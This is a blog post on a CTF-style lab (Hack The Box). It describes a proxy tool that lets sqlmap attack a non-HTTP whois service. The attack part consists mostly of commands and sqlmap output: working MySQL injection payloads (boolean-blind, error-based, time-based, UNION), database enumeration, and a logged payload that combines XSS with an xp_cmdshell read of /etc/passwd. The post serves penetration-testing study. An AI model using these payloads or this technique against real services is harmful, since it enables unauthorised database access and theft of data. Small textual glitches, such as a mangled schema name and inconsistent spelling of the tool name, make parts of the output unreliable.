---
title: Introducing sqlmap into non-HTTP services.
published: true
---

Recently, I was introduced to an interesting problem. How to automate the SQL injection exploitation of non-HTTP service? Sometimes services like `whois` are using custom SQL databases, which is an ideal situation to produce unwanted problems. Because of that, the `whois` service is working on a non-retired HTB box, I can't do it very detailed, but you should be able to take advantage of the idea itself to create your custom proxies or just give a try with `shiny-garbonzo`. Let's start by diving into the information on how sqlmap works.

## sqlmap®:

You should already know that it can automate the SQL injection attack using requests to HTTP/S sites and some magic :) While passing an interesting HTTP request or URL to it, it can test all parameters, no matter if it is GET or POST or even HTTP header based injection point. But what to do when you know that your non-HTTP service is prone to SQL injection attack? You can exploit it manually which is recommended for learning sake or use a tool that is dedicated to that service being able to communicate with it and script your way into.

## Toolbelt:

- sqlmap 1.3.9#stable
- python 3.7

## Tool:

https://github.com/haqpl/shiny-garbanzo


## Working example:

Below you can see an example usage of `shiny-garbanzo` and the corresponding output of sqlmap, which identified and successfully exploited four different types of SQLi vulnerability in non-HTTP service.


{% include figure.html file="/assets/shiny-garbanzo.png" alt="/assets/shiny-garbanzo.png" number="1" caption="SQL injection in non-HTTP service." %}

```
python3 shiny-garbanzo.py --host '127.0.0.1' --tool "whois" --port 1337 --arguments="-h IP SQLMAP"
[i] Starting server on 1337 PORT
[i] Start with this:
[+] sqlmap -u "127.0.0.1:1337" --data "cmd=" -p "cmd" --method POST
127.0.0.1 - - [23/Oct/2019 18:20:17] "POST / HTTP/1.1" 200 -
127.0.0.1 - - [23/Oct/2019 18:20:17] "POST /?lgda=9167%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 -
127.0.0.1 - - [23/Oct/2019 18:20:17] "POST / HTTP/1.1" 200 -
...
```

```
sqlmap -u "http://127.0.0.1:1337" --data "cmd=" -p "cmd" --method POST --tables 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:20:16 /2019-10-23/

[18:20:17] [WARNING] provided value for parameter 'cmd' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[18:20:17] [INFO] testing connection to the target URL
[18:20:17] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.7.5rc1')
[18:20:17] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:20:17] [INFO] testing if the target URL content is stable
[18:20:17] [INFO] target URL content is stable
[18:20:17] [INFO] heuristic (basic) test shows that POST parameter 'cmd' might be injectable (possible DBMS: 'MySQL')
[18:20:17] [INFO] heuristic (XSS) test shows that POST parameter 'cmd' might be vulnerable to cross-site scripting (XSS) attacks
[18:20:17] [INFO] testing for SQL injection on POST parameter 'cmd'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSesfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and [18:20:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:20:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:20:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:20:25] [WARNING] reflective value(s) found and filtering out
[18:20:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:20:27] [INFO] POST parameter 'cmd' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable 
...
[18:20:27] [INFO] POST parameter 'cmd' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[18:20:27] [INFO] testing 'MySQL inline queries'
[18:20:27] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[18:20:27] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[18:20:27] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[18:20:27] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[18:20:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[18:20:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[18:20:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:20:38] [INFO] POST parameter 'cmd' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[18:20:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:20:38] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[18:20:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:20:38] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:20:38] [INFO] target URL appears to have 2 columns in query
[18:20:38] [INFO] POST parameter 'cmd' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[18:20:38] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'cmd' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: cmd (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: cmd=-5703') OR 4258=4258#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: cmd=') AND (SELECT 9790 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(9790=9790,1))),0x71627a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mPGW

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cmd=') AND (SELECT 9669 FROM (SELECT(SLEEP(5)))ocLO)-- pzpA

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: cmd=') UNION ALL SELECT CONCAT(0x716a7a6271,0x736e52496f5a646e56714f70556150784b766b6648696a45746d6869424875725a77684354704b70,0x71627a6b71),NULL#
---
[18:20:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[18:20:45] [INFO] fetching database names
[18:20:45] [INFO] fetching tables for databases: 'information_schema, whois'
Database: informati\non_schema
[1 table]
...

Database: whois
[1 table]
...

Database: information_schema
[77 tables]
...

[18:20:45] [INFO] fetched data logged to text files under './output/127.0.0.1'

[*] ending @ 18:20:45 /2019-10-23/

```

## Credits:

[https://twitter.com/kolokokop](@kolokokop), he did it the same way ;)


If you found that idea interesting and have a non-HTTP service in mind which could be tested, please contact me or just comment on the post.
